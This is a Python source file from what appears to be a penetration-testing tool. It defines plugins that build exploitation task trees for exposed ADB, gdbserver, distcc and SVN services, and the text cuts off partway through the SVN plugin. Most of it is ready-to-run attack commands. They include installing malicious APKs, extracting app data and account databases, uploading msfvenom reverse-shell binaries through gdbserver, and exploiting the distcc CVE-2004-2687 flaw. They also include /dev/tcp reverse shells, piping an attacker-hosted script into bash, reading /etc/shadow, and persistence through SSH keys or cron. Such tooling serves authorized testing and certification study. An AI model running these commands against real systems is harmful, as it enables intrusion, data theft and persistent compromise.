"""
Development Tools & Debug Protocols Service Plugin

Handles enumeration and exploitation of developer/debug services:
- Android Debug Bridge (ADB) - Port 5555
- Remote GDB Server - Various ports
- Distcc (Distributed C Compiler) - Port 3632
- Subversion (SVN) - Port 3690
- Git Repository Exposure - HTTP/HTTPS

Extracted from HackTricks pentesting guides
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class ADBPlugin(ServicePlugin):
    """Android Debug Bridge enumeration and exploitation plugin"""

    @property
    def name(self) -> str:
        return "adb"

    @property
    def default_ports(self) -> List[int]:
        return [5555]

    @property
    def service_names(self) -> List[str]:
        return ['adb', 'android debug bridge', 'android-debug-bridge']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Detect ADB services"""
        service = port_info.get('service', '').lower()
        product = port_info.get('product', '').lower()
        port = port_info.get('port')

        # Check service name
        if any(svc in service for svc in ['adb', 'android']):
            return True

        # Check product
        if 'android debug bridge' in product:
            return True

        # Check default port
        if port == 5555:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate ADB enumeration task tree"""
        tasks = {
            'id': f'adb-enum-{port}',
            'name': f'Android Debug Bridge Enumeration (Port {port})',
            'type': 'parent',
            'children': []
        }

        # Task 1: Connect to ADB
        tasks['children'].append({
            'id': f'adb-connect-{port}',
            'name': 'Connect to ADB',
            'type': 'command',
            'metadata': {
                'command': f'adb connect {target}:{port}',
                'description': 'Establish connection to exposed ADB daemon',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                'flag_explanations': {
                    'connect': 'Connect to remote ADB daemon over TCP',
                    f'{target}:{port}': 'Target IP and port (default 5555 for classic mode)'
                },
                'success_indicators': [
                    'Connected to {target}:{port}',
                    'Device appears in "adb devices -l" as "device" state',
                    'Shell access granted without authorization prompt'
                ],
                'failure_indicators': [
                    'Connection refused (ADB not exposed)',
                    'Device shows as "unauthorized" (requires RSA auth)',
                    'Device shows as "offline"'
                ],
                'next_steps': [
                    'Verify connection: adb devices -l',
                    'Get shell: adb shell',
                    'Check privileges: id; whoami',
                    'Test root access: adb root'
                ],
                'alternatives': [
                    'Manual: nc {target} {port} (raw TCP connection)',
                    'For Android 11+: Use mDNS discovery → adb mdns services',
                    'Wireless pairing: adb pair {target}:pair_port (requires 6-digit code)'
                ],
                'notes': 'Classic ADB (port 5555) often lacks authentication on IoT devices, engineering builds, emulators, and smart TVs. Modern Android 11+ uses TLS with pairing.',
                'estimated_time': '1-2 minutes'
            }
        })

        # Task 2: Enumerate device info
        tasks['children'].append({
            'id': f'adb-enumerate-{port}',
            'name': 'Enumerate Device Information',
            'type': 'command',
            'metadata': {
                'command': f'adb -s {target}:{port} shell "id; getenforce; getprop ro.build.type ro.debuggable ro.adb.secure ro.product.model"',
                'description': 'Check privileges, SELinux status, and build type',
                'tags': ['OSCP:HIGH', 'ENUM'],
                'flag_explanations': {
                    '-s': 'Specify target device serial/address',
                    'shell': 'Execute shell command on device',
                    'id': 'Show user ID and groups (uid=2000 is shell user)',
                    'getenforce': 'SELinux mode (Enforcing/Permissive/Disabled)',
                    'getprop': 'Read Android system properties',
                    'ro.build.type': 'Build type (user/userdebug/eng)',
                    'ro.debuggable': '1=debuggable build, 0=production',
                    'ro.adb.secure': '1=requires auth, 0=open access'
                },
                'success_indicators': [
                    'uid=0 (root access!) or uid=2000 (shell)',
                    'ro.debuggable=1 (can debug apps with run-as)',
                    'ro.adb.secure=0 (no authentication required)',
                    'getenforce=Permissive or Disabled (SELinux not enforcing)'
                ],
                'failure_indicators': [
                    'Permission denied',
                    'SELinux blocking commands',
                    'Shell limited to restricted user'
                ],
                'next_steps': [
                    'If ro.debuggable=1: Use run-as to access app data',
                    'If uid=0: Full root access, pull /data/system/users/0/accounts.db',
                    'List apps: pm list packages -3',
                    'Check for root: adb root'
                ],
                'alternatives': [
                    'Manual shell: adb shell then run commands interactively',
                    'Single properties: getprop ro.build.fingerprint'
                ],
                'notes': 'Engineering builds (eng/userdebug) often allow "adb root" to restart adbd as root. Production builds (user) typically deny this.'
            }
        })

        # Task 3: Root escalation
        tasks['children'].append({
            'id': f'adb-root-{port}',
            'name': 'Attempt Root Escalation',
            'type': 'command',
            'metadata': {
                'command': f'adb -s {target}:{port} root',
                'description': 'Restart ADB daemon as root (works on eng/userdebug builds)',
                'tags': ['OSCP:HIGH', 'EXPLOIT'],
                'flag_explanations': {
                    'root': 'Restart adbd daemon with root privileges (if build allows)'
                },
                'success_indicators': [
                    'Restarting adbd as root',
                    'Shell now shows uid=0',
                    'Can access /data without restrictions'
                ],
                'failure_indicators': [
                    'adbd cannot run as root in production builds',
                    'Device is production build (ro.build.type=user)',
                    'Root access denied'
                ],
                'next_steps': [
                    'If success: adb shell → full root access',
                    'Pull sensitive data: /data/system/users/0/accounts.db',
                    'Extract app data: cp -a /data/data/<pkg> /sdcard/',
                    'If fails: Try run-as for debuggable apps'
                ],
                'alternatives': [
                    'Manual root check: su (if device has su binary)',
                    'For specific apps: run-as <pkg> (requires debuggable)',
                    'Kernel exploits: DirtyCow, Towelroot (older devices)'
                ],
                'notes': 'Most production Android devices deny adb root. Works on: emulators, development kits, engineering ROMs, some IoT/TV devices.',
                'estimated_time': '1 minute'
            }
        })

        # Task 4: App enumeration and extraction
        tasks['children'].append({
            'id': f'adb-app-extraction-{port}',
            'name': 'App Data Enumeration & Extraction',
            'type': 'parent',
            'children': [
                {
                    'id': f'adb-list-apps-{port}',
                    'name': 'List Third-Party Apps',
                    'type': 'command',
                    'metadata': {
                        'command': f'adb -s {target}:{port} shell pm list packages -3',
                        'description': 'List all non-system (third-party) apps',
                        'tags': ['OSCP:HIGH', 'ENUM'],
                        'flag_explanations': {
                            'pm': 'Package Manager command',
                            'list packages': 'List installed packages',
                            '-3': 'Show third-party apps only (exclude system apps)'
                        },
                        'success_indicators': [
                            'List of package names (e.g., com.example.app)',
                            'Banking apps, corporate apps, custom apps visible'
                        ],
                        'alternatives': [
                            'All packages: pm list packages',
                            'System apps: pm list packages -s',
                            'Get APK path: pm path <pkg>'
                        ]
                    }
                },
                {
                    'id': f'adb-extract-debuggable-{port}',
                    'name': 'Extract Debuggable App Data (No Root)',
                    'type': 'command',
                    'metadata': {
                        'command': f'adb -s {target}:{port} shell "run-as <pkg> sh -c \'cd /data/data/<pkg> && tar cf - .\'" | tar xf - -C ./loot/<pkg>',
                        'description': 'Extract app data using run-as for debuggable apps (no root needed)',
                        'tags': ['OSCP:HIGH', 'DATA_EXFIL'],
                        'flag_explanations': {
                            'run-as': 'Run command as app UID (only works on debuggable apps)',
                            '<pkg>': 'Package name (e.g., com.victim.app)',
                            'tar cf -': 'Create tar archive to stdout',
                            '/data/data/<pkg>': 'App private data directory',
                            '| tar xf -': 'Extract tar archive locally'
                        },
                        'success_indicators': [
                            'App data extracted to ./loot/<pkg>/',
                            'databases/ folder contains SQLite DBs',
                            'shared_prefs/ contains XML configs with secrets'
                        ],
                        'failure_indicators': [
                            'run-as: Package not debuggable',
                            'Permission denied (app not debuggable or no shell access)'
                        ],
                        'next_steps': [
                            'Analyze databases/: sqlite3 database.db',
                            'Grep for secrets: grep -r password ./loot/',
                            'Check shared_prefs/: cat *.xml | grep -i token'
                        ],
                        'alternatives': [
                            'With root: cp -a /data/data/<pkg> /sdcard/ → adb pull',
                            'Backup: adb backup -f app.ab <pkg> → unpack with abe.jar',
                            'Manual: run-as <pkg> then ls, cat files interactively'
                        ],
                        'notes': 'run-as only works if app has android:debuggable=true in AndroidManifest.xml (common in dev builds, rare in production).'
                    }
                },
                {
                    'id': f'adb-extract-root-{port}',
                    'name': 'Extract All App Data (With Root)',
                    'type': 'command',
                    'metadata': {
                        'command': f'adb -s {target}:{port} shell "cp -a /data/data/<pkg> /sdcard/<pkg>" && adb pull /sdcard/<pkg>',
                        'description': 'Copy app data to sdcard and pull to attacker machine (requires root)',
                        'tags': ['OSCP:HIGH', 'DATA_EXFIL', 'REQUIRES_ROOT'],
                        'flag_explanations': {
                            'cp -a': 'Copy with preserved permissions/timestamps',
                            '/data/data/<pkg>': 'App private data (root-only)',
                            '/sdcard/': 'Public storage accessible without root',
                            'adb pull': 'Download files from device to local machine'
                        },
                        'success_indicators': [
                            'Files copied to sdcard',
                            'adb pull completes successfully',
                            'Local directory contains app data'
                        ],
                        'next_steps': [
                            'Search for credentials in databases',
                            'Decrypt app-specific encrypted storage',
                            'Extract WiFi passwords: /data/misc/wifi/'
                        ],
                        'alternatives': [
                            'Direct pull (slow): adb pull /data/data/<pkg>',
                            'Tar over network: adb shell "tar cf - /data/data/<pkg>" | ncat HOST 9000'
                        ],
                        'notes': 'Requires successful "adb root" or device with pre-rooted firmware.'
                    }
                }
            ]
        })

        # Task 5: Port forwarding and pivoting
        tasks['children'].append({
            'id': f'adb-pivoting-{port}',
            'name': 'Port Forwarding & Network Pivoting',
            'type': 'parent',
            'children': [
                {
                    'id': f'adb-forward-{port}',
                    'name': 'Forward Device Port to Host',
                    'type': 'command',
                    'metadata': {
                        'command': f'adb -s {target}:{port} forward tcp:2222 tcp:22',
                        'description': 'Forward device-local service to attacker machine',
                        'tags': ['OSCP:MEDIUM', 'PIVOTING'],
                        'flag_explanations': {
                            'forward': 'Create port forwarding tunnel',
                            'tcp:2222': 'Local port on attacker machine',
                            'tcp:22': 'Remote port on Android device'
                        },
                        'success_indicators': [
                            'Port forwarding established',
                            'Can access device service via localhost:2222'
                        ],
                        'alternatives': [
                            'SSH via Termux: Install Dropbear/OpenSSH in Termux app',
                            'Reverse tunnel: adb reverse tcp:1080 tcp:1080'
                        ],
                        'notes': 'Useful for accessing device-local services (Termux SSH, app debug servers, VNC, etc.) without direct network access.'
                    }
                },
                {
                    'id': f'adb-reverse-{port}',
                    'name': 'Reverse Tunnel (Device → Host)',
                    'type': 'command',
                    'metadata': {
                        'command': f'adb -s {target}:{port} reverse tcp:1080 tcp:1080',
                        'description': 'Let device apps reach attacker services as localhost',
                        'tags': ['OSCP:MEDIUM', 'PIVOTING'],
                        'flag_explanations': {
                            'reverse': 'Reverse port forwarding (device connects to host)',
                            'tcp:1080': 'Port on device (accessible as 127.0.0.1:1080)',
                            'tcp:1080': 'Port on attacker machine'
                        },
                        'success_indicators': [
                            'Reverse forwarding established',
                            'Device can reach host service via localhost:1080'
                        ],
                        'alternatives': [
                            'Manual proxy: Configure app to use host SOCKS/HTTP proxy',
                            'VPN: Run VPN server on host, connect device'
                        ],
                        'notes': 'Enables device apps to reach attacker C2, proxy, or exploitation servers without exposing attacker IP to network.'
                    }
                }
            ]
        })

        # Task 6: Payload installation
        tasks['children'].append({
            'id': f'adb-payload-{port}',
            'name': 'Install Malicious APK',
            'type': 'command',
            'metadata': {
                'command': f'adb -s {target}:{port} install -r -g payload.apk && adb shell monkey -p <pkg> -c android.intent.category.LAUNCHER 1',
                'description': 'Install APK with auto-granted permissions and launch',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT'],
                'flag_explanations': {
                    'install': 'Install APK package',
                    '-r': 'Replace existing app if installed',
                    '-g': 'Grant all runtime permissions declared in manifest',
                    'monkey': 'UI/application exerciser for testing',
                    '-p': 'Package to run',
                    '-c android.intent.category.LAUNCHER': 'Launch main activity',
                    '1': 'Number of events to generate (1 = just launch)'
                },
                'success_indicators': [
                    'Success message from adb install',
                    'App launches via monkey',
                    'Payload executes (check C2 listener)'
                ],
                'failure_indicators': [
                    'INSTALL_FAILED_INSUFFICIENT_STORAGE',
                    'Installation blocked (Play Protect on some devices)',
                    'Permissions not granted despite -g flag'
                ],
                'next_steps': [
                    'Monitor C2 for callback',
                    'Interact with payload: adb shell am start -n <pkg>/<activity>',
                    'Broadcast intents: adb shell am broadcast -a <action>'
                ],
                'alternatives': [
                    'Manual install: adb push payload.apk /sdcard/ → pm install',
                    'Start service: adb shell am startservice -n <pkg>/<service>',
                    'Send broadcast: adb shell am broadcast -a android.intent.action.BOOT_COMPLETED'
                ],
                'notes': 'Generate APK with msfvenom: msfvenom -p android/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -o payload.apk'
            }
        })

        # Task 7: Wireless debugging exploitation (Android 11+)
        tasks['children'].append({
            'id': f'adb-wireless-{port}',
            'name': 'Wireless Debugging Exploitation (Android 11+)',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit Android 11+ Wireless Debugging with TLS pairing',
                'tags': ['OSCP:LOW', 'MANUAL', 'REQUIRES_INTERACTION'],
                'alternatives': [
                    'Requires physical/UI access to enable Wireless Debugging',
                    'Settings → Developer Options → Wireless Debugging → Pair device',
                    'View 6-digit pairing code on device',
                    'Attacker: adb pair <device_ip>:<pair_port> (enter code)',
                    'Then: adb connect <device_ip>:<connect_port>',
                    'Discover via mDNS: adb mdns services'
                ],
                'notes': 'Modern Android uses TLS-protected ADB with pairing. Requires one-time physical access or MDM misconfiguration to enable. Ports are dynamic (not 5555) and discovered via mDNS (_adb-tls-connect._tcp).',
                'next_steps': [
                    'If mDNS blocked: Use classic USB method → adb tcpip 5555',
                    'Check for engineering builds with pre-enabled TCP ADB',
                    'Social engineering: Trick user into enabling Wireless Debugging'
                ]
            }
        })

        return tasks


@ServiceRegistry.register
class GDBServerPlugin(ServicePlugin):
    """Remote GDB Server exploitation plugin"""

    @property
    def name(self) -> str:
        return "gdbserver"

    @property
    def default_ports(self) -> List[int]:
        return []  # No standard port

    @property
    def service_names(self) -> List[str]:
        return ['gdbserver', 'gdb', 'gnu debugger']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Detect GDB Server"""
        service = port_info.get('service', '').lower()
        product = port_info.get('product', '').lower()

        # Check for gdb-related keywords
        if any(keyword in service for keyword in ['gdb', 'debugger']):
            return True

        if 'gdb' in product:
            return True

        # Note: nmap often misses gdbserver - manual verification needed
        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate GDB Server exploitation task tree"""
        tasks = {
            'id': f'gdbserver-exploit-{port}',
            'name': f'GDB Server Exploitation (Port {port})',
            'type': 'parent',
            'children': []
        }

        # Task 1: Upload and execute payload
        tasks['children'].append({
            'id': f'gdbserver-upload-exec-{port}',
            'name': 'Upload & Execute ELF Backdoor',
            'type': 'command',
            'metadata': {
                'command': f'''msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> PrependFork=true -f elf -o backdoor.elf && chmod +x backdoor.elf && gdb backdoor.elf -ex "target extended-remote {target}:{port}" -ex "remote put backdoor.elf backdoor.elf" -ex "set remote exec-file /tmp/backdoor.elf" -ex "run"''',
                'description': 'Generate ELF payload, upload via gdb, and execute on target',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'RCE'],
                'flag_explanations': {
                    'msfvenom': 'Metasploit payload generator',
                    '-p linux/x64/shell_reverse_tcp': 'Linux 64-bit reverse shell payload',
                    'LHOST': 'Attacker IP for callback',
                    'LPORT': 'Attacker port for listener',
                    'PrependFork=true': 'Fork before payload execution (keeps debugger connection alive)',
                    '-f elf': 'Output format (executable ELF binary)',
                    'gdb': 'GNU Debugger client',
                    'target extended-remote': 'Connect to remote gdbserver',
                    'remote put': 'Upload file to remote target',
                    'set remote exec-file': 'Specify remote executable path',
                    'run': 'Execute the program on target'
                },
                'success_indicators': [
                    'msfvenom generates backdoor.elf successfully',
                    'GDB connects to remote target',
                    'File uploaded to target',
                    'Reverse shell connection received on listener'
                ],
                'failure_indicators': [
                    'Connection refused (gdbserver not exposed)',
                    'Permission denied on file upload',
                    'Target lacks execute permissions on /tmp',
                    'Architecture mismatch (x86 vs x64, ARM)'
                ],
                'next_steps': [
                    'Start listener first: nc -lvnp <LPORT>',
                    'After shell: Check privileges (id)',
                    'Enumerate: uname -a, ps aux, netstat -tulpn',
                    'Pivot: Look for credentials, SSH keys, internal services'
                ],
                'alternatives': [
                    'Manual: Generate payload, upload via gdb, execute',
                    'Different payload: msfvenom -p linux/x64/meterpreter/reverse_tcp',
                    'ARM targets: -p linux/armle/shell_reverse_tcp',
                    'Static binary: Upload custom compiled exploit'
                ],
                'notes': 'gdbserver allows arbitrary code execution by design (debugging requires code injection). No CVE needed - this is intended functionality abused. Ensure architecture matches (x86/x64/ARM).',
                'estimated_time': '3-5 minutes'
            }
        })

        # Task 2: Execute arbitrary commands via Python script
        tasks['children'].append({
            'id': f'gdbserver-arbitrary-cmd-{port}',
            'name': 'Execute Arbitrary Commands (Python Script)',
            'type': 'parent',
            'children': [
                {
                    'id': f'gdbserver-create-script-{port}',
                    'name': 'Create remote-cmd.py GDB Script',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Create Python GDB extension for command execution',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'alternatives': [
                            'Download: wget https://gist.githubusercontent.com/example/remote-cmd.py',
                            'Or create locally (see HackTricks guide)',
                            'Script creates custom "rcmd" GDB command',
                            'Uses fork() + execl() via GDB API to run shell commands'
                        ],
                        'notes': 'Python script hooks into GDB to run shell commands on remote target via libc function calls (fork, execl, malloc, etc.).'
                    }
                },
                {
                    'id': f'gdbserver-run-commands-{port}',
                    'name': 'Run Commands via GDB Python Extension',
                    'type': 'command',
                    'metadata': {
                        'command': f'''gdb -ex "target extended-remote {target}:{port}" -ex "source ./remote-cmd.py" -ex "set remote exec-file /bin/bash" -ex "run" -ex "tb main" -ex "run" -ex "rcmd id" -ex "rcmd whoami"''',
                        'description': 'Execute arbitrary commands using GDB Python extension',
                        'tags': ['OSCP:MEDIUM', 'RCE'],
                        'flag_explanations': {
                            'source': 'Load Python script into GDB',
                            './remote-cmd.py': 'Custom GDB command extension',
                            'set remote exec-file': 'Use /bin/bash for libc symbols',
                            'tb main': 'Temporary breakpoint at main() to load libc',
                            'rcmd': 'Custom command from Python script',
                            'id': 'Example command to execute on target'
                        },
                        'success_indicators': [
                            'GDB connects successfully',
                            'Python script loads without errors',
                            'Commands execute and output displayed',
                            'Target shell available via rcmd'
                        ],
                        'failure_indicators': [
                            'Python script not found',
                            'Libc symbols not loaded (need to reach main)',
                            'Permission denied on command execution'
                        ],
                        'next_steps': [
                            'Enumerate: rcmd "cat /etc/passwd"',
                            'Reverse shell: rcmd "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"',
                            'Download data: rcmd "cat /etc/shadow | base64"',
                            'Plant backdoor: rcmd "curl http://<attacker>/shell.sh | bash"'
                        ],
                        'alternatives': [
                            'Interactive: Run GDB, then type "rcmd <command>" manually',
                            'Different shell: set remote exec-file /bin/sh',
                            'Metasploit module: exploit/multi/gdb/gdb_server_exec'
                        ],
                        'notes': 'Requires target process to have libc loaded. Script uses malloc/fork/execl from libc to spawn commands. More flexible than direct ELF upload.'
                    }
                }
            ]
        })

        # Task 3: Detection notes
        tasks['children'].append({
            'id': f'gdbserver-detection-{port}',
            'name': 'Detection & Reconnaissance',
            'type': 'manual',
            'metadata': {
                'description': 'GDB Server detection challenges',
                'tags': ['OSCP:HIGH', 'RECON'],
                'alternatives': [
                    'Nmap often misses gdbserver (no standard fingerprint)',
                    'Manual banner grab: nc -vn {target} {port}',
                    'Look for responses to GDB protocol packets',
                    'Check common debug ports: 1234, 2345, 9999, random high ports',
                    'If process list available: ps aux | grep gdbserver'
                ],
                'next_steps': [
                    'Try connection: gdb -ex "target extended-remote {target}:{port}"',
                    'If connects: Proceed with exploitation',
                    'Document port in findings for future reference'
                ],
                'notes': 'GDB server can listen on ANY port - no standard port. Often found in CTFs, embedded systems, development environments. Nmap service detection frequently fails.'
            }
        })

        return tasks


@ServiceRegistry.register
class DistccPlugin(ServicePlugin):
    """Distcc (Distributed C Compiler) exploitation plugin"""

    @property
    def name(self) -> str:
        return "distcc"

    @property
    def default_ports(self) -> List[int]:
        return [3632]

    @property
    def service_names(self) -> List[str]:
        return ['distcc', 'distccd']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Detect Distcc service"""
        service = port_info.get('service', '').lower()
        port = port_info.get('port')

        # Check service name
        if 'distcc' in service:
            return True

        # Check default port
        if port == 3632:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Distcc exploitation task tree"""
        tasks = {
            'id': f'distcc-exploit-{port}',
            'name': f'Distcc Exploitation (Port {port})',
            'type': 'parent',
            'children': []
        }

        # Task 1: CVE-2004-2687 exploitation (Metasploit)
        tasks['children'].append({
            'id': f'distcc-cve-msf-{port}',
            'name': 'CVE-2004-2687: Command Injection (Metasploit)',
            'type': 'command',
            'metadata': {
                'command': f'msfconsole -q -x "use exploit/unix/misc/distcc_exec; set RHOSTS {target}; set RPORT {port}; set LHOST <LHOST>; set LPORT <LPORT>; exploit"',
                'description': 'Exploit distcc command injection vulnerability for RCE',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'RCE', 'QUICK_WIN'],
                'flag_explanations': {
                    'use exploit/unix/misc/distcc_exec': 'Metasploit distcc exploitation module',
                    'RHOSTS': 'Target IP address',
                    'RPORT': 'Target port (default 3632)',
                    'LHOST': 'Attacker IP for reverse connection',
                    'LPORT': 'Attacker listening port',
                    'exploit': 'Launch the exploit'
                },
                'success_indicators': [
                    'Meterpreter session opened',
                    'Shell access gained',
                    'Command execution confirmed'
                ],
                'failure_indicators': [
                    'Exploit failed (may not be vulnerable)',
                    'Connection refused',
                    'Distcc daemon not responding'
                ],
                'next_steps': [
                    'Check user: whoami (often runs as daemon user)',
                    'Enumerate system: uname -a, cat /etc/issue',
                    'Privilege escalation: Search for SUID binaries, kernel exploits',
                    'Lateral movement: Check /home, ~/.ssh/authorized_keys'
                ],
                'alternatives': [
                    'Manual nmap NSE: nmap -p {port} {target} --script distcc-cve2004-2687',
                    'Manual exploit: See GitHub gists for standalone Python/Bash scripts',
                    'Direct command: Use Nmap NSE with --script-args for custom command'
                ],
                'notes': 'CVE-2004-2687 allows arbitrary command execution by injecting shell metacharacters into compilation requests. Distcc daemon often runs as low-privileged user (distccd, daemon).',
                'estimated_time': '2-3 minutes'
            }
        })

        # Task 2: Nmap NSE script
        tasks['children'].append({
            'id': f'distcc-cve-nmap-{port}',
            'name': 'CVE-2004-2687: Detection & Exploitation (Nmap NSE)',
            'type': 'command',
            'metadata': {
                'command': f'nmap -p {port} {target} --script distcc-cve2004-2687 --script-args="distcc-exec.cmd=\'id\'"',
                'description': 'Test for vulnerability and execute command via Nmap NSE',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'RECON'],
                'flag_explanations': {
                    '--script': 'Execute Nmap Scripting Engine script',
                    'distcc-cve2004-2687': 'NSE script for distcc command injection',
                    '--script-args': 'Pass arguments to NSE script',
                    'distcc-exec.cmd': 'Command to execute on target',
                    'id': 'Example command (shows user ID)'
                },
                'success_indicators': [
                    'Command output displayed in Nmap results',
                    'Vulnerable: YES',
                    'Output shows uid/gid of distcc daemon'
                ],
                'failure_indicators': [
                    'Script returns "Not vulnerable"',
                    'No command output',
                    'Connection timeout'
                ],
                'next_steps': [
                    'Try reverse shell: --script-args="distcc-exec.cmd=\'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\'"',
                    'If reverse shell blocked: Try bind shell or data exfiltration',
                    'Alternative: Use Metasploit module for session management'
                ],
                'alternatives': [
                    'Manual testing: nc {target} {port} then send malicious compilation request',
                    'Python script: https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855',
                    'Metasploit module (more stable): exploit/unix/misc/distcc_exec'
                ],
                'notes': 'Nmap NSE is quick for testing but Metasploit provides better session handling. Distcc vulnerability is trivial to exploit - no authentication or complex conditions required.',
                'estimated_time': '1-2 minutes'
            }
        })

        # Task 3: Post-exploitation
        tasks['children'].append({
            'id': f'distcc-post-exploit-{port}',
            'name': 'Post-Exploitation Enumeration',
            'type': 'manual',
            'metadata': {
                'description': 'Post-exploitation steps after gaining shell',
                'tags': ['OSCP:HIGH', 'POST_EXPLOIT'],
                'alternatives': [
                    'Check user: id, whoami (likely daemon/distccd)',
                    'Enumerate system: uname -a, cat /etc/*-release',
                    'Network: ifconfig, ip a, netstat -tulpn',
                    'Users: cat /etc/passwd, ls /home',
                    'SUID binaries: find / -perm -u=s -type f 2>/dev/null',
                    'Writable directories: find / -writable -type d 2>/dev/null',
                    'Kernel version: uname -r → searchsploit kernel <version>'
                ],
                'next_steps': [
                    'Upgrade shell: python -c "import pty;pty.spawn(\'/bin/bash\')"',
                    'Stabilize: export TERM=xterm; stty raw -echo; fg',
                    'Privilege escalation: Run linpeas.sh or manual enumeration',
                    'Persistence: Add SSH key, cron job, or backdoor service'
                ],
                'notes': 'Distcc daemon typically runs with limited privileges. Focus on privilege escalation vectors: SUID binaries, kernel exploits, sudo misconfigurations, cron jobs.'
            }
        })

        return tasks


@ServiceRegistry.register
class SVNPlugin(ServicePlugin):
    """Subversion (SVN) enumeration plugin"""

    @property
    def name(self) -> str:
        return "svn"

    @property
    def default_ports(self) -> List[int]:
        return [3690]

    @property
    def service_names(self) -> List[str]:
        return ['svn', 'svnserve', 'subversion']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Detect SVN service"""
        service = port_info.get('service', '').lower()
        product = port_info.get('product', '').lower()
        port = port_info.get('port')

        # Check service name
        if any(keyword in service for keyword in ['svn', 'subversion']):
            return True

        # Check product
        if 'subversion' in product:
            return True

        # Check default port
        if port == 3690:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate SVN enumeration task tree"""
        tasks = {
            'id': f'svn-enum-{port}',
            'name': f'Subversion (SVN) Enumeration (Port {port})',
            'type': 'parent',
            'children': []
        }

        # Task 1: Banner grabbing
        tasks['children'].append({
            'id': f'svn-banner-{port}',
            'name': 'Banner Grabbing',
            'type': 'command',
            'metadata': {
                'command': f'nc -vn {target} {port}',
                'description': 'Connect to SVN server and read banner',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                'flag_explanations': {
                    'nc': 'Netcat - network connection tool',
                    '-v': 'Verbose output',
                    '-n': 'Numeric IP (no DNS resolution)',
                    f'{target}': 'Target IP address',
                    f'{port}': 'SVN port (default 3690)'
                },
                'success_indicators': [
                    'SVN banner displayed',
                    'Version information revealed',
                    'Server responds to connection'
                ],
                'failure_indicators': [
                    'Connection refused',
                    'Connection timeout',
                    'No banner received'
                ],
                'next_steps': [
                    'Note version for vulnerability research',
                    'Attempt anonymous repository access',
                    'Enumerate repositories'
                ],
                'alternatives': [
                    'Nmap banner: nmap -sV -p {port} {target}',
                    'Telnet: telnet {target} {port}'
                ],
                'notes': 'SVN server (svnserve) typically reveals version in banner. Older versions may have known vulnerabilities.',
                'estimated_time': '30 seconds'
            }
        })

        # Task 2: List repositories
        tasks['children'].append({
            'id': f'svn-list-{port}',
            'name': 'List Repository Contents',
            'type': 'command',
            'metadata': {
                'command': f'svn ls svn://{target}',
                'description': 'List files and directories in SVN repository',
                'tags': ['OSCP:HIGH', 'ENUM', 'QUICK_WIN'],
                'flag_explanations': {
                    'svn': 'Subversion command-line client',
                    'ls': 'List directory contents',
                    f'svn://{target}': 'SVN protocol URL (default port 3690)'
                },
                'success_indicators': [
                    'File/directory listing displayed',
                    'Repository accessible without authentication',
                    'Source code, configs, or sensitive files visible'
                ],
                'failure_indicators': [
                    'Authorization required',
                    'Repository not found',
                    'Network unreachable'
                ],
                'next_steps': [
                    'Check for sensitive files: config/, credentials/, .env',
                    'Download entire repository: svn checkout',
                    'Review commit history: svn log'
                ],
                'alternatives': [
                    'With port: svn ls svn://{target}:{port}',
                    'Specific path: svn ls svn://{target}/trunk',
                    'HTTP access: svn ls http://{target}/svn/'
                ],
                'notes': 'Many SVN servers allow anonymous read access. Look for: database credentials, API keys, internal documentation, developer notes.',
                'estimated_time': '1 minute'
            }
        })

        # Task 3: View commit history
        tasks['children'].append({
            'id': f'svn-log-{port}',
            'name': 'View Commit History',
            'type': 'command',
            'metadata': {
                'command': f'svn log svn://{target}',
                'description': 'View commit messages and revision history',
                'tags': ['OSCP:HIGH', 'ENUM'],
                'flag_explanations': {
                    'log': 'Display commit log messages',
                    f'svn://{target}': 'Repository URL'
                },
                'success_indicators': [
                    'Commit history displayed',
                    'Author names, dates, revision numbers visible',
                    'Commit messages reveal changes'
                ],
                'failure_indicators': [
                    'Repository empty',
                    'Authorization required',
                    'No commits found'
                ],
                'next_steps': [
                    'Look for sensitive commits: "password", "fix", "remove"',
                    'Check author emails for username enumeration',
                    'Download specific revisions: svn up -r <revision>',
                    'Diff between revisions: svn diff -r <rev1>:<rev2>'
                ],
                'alternatives': [
                    'Limit output: svn log -l 10 (last 10 commits)',
                    'Verbose: svn log -v (shows changed files)',
                    'Date range: svn log -r {2024-01-01}:{2024-12-31}'
                ],
                'notes': 'Commit history often reveals: Developers who committed credentials then deleted them, Email addresses for phishing, Application architecture, Vulnerability fixes that reveal bugs.',
                'estimated_time': '2 minutes'
            }
        })

        # Task 4: Checkout repository
        tasks['children'].append({
            'id': f'svn-checkout-{port}',
            'name': 'Download Entire Repository',
            'type': 'command',
            'metadata': {
                'command': f'svn checkout svn://{target} ./svn-repo',
                'description': 'Clone full repository to local directory',
                'tags': ['OSCP:HIGH', 'DATA_EXFIL'],
                'flag_explanations': {
                    'checkout': 'Download working copy of repository',
                    f'svn://{target}': 'Repository URL',
                    './svn-repo': 'Local destination directory'
                },
                'success_indicators': [
                    'Files downloaded successfully',
                    'Working copy created',
                    'Checked out revision <number>'
                ],
                'failure_indicators': [
                    'Permission denied',
                    'Disk space insufficient',
                    'Network interrupted'
                ],
                'next_steps': [
                    'Search for secrets: grep -r "password" ./svn-repo',
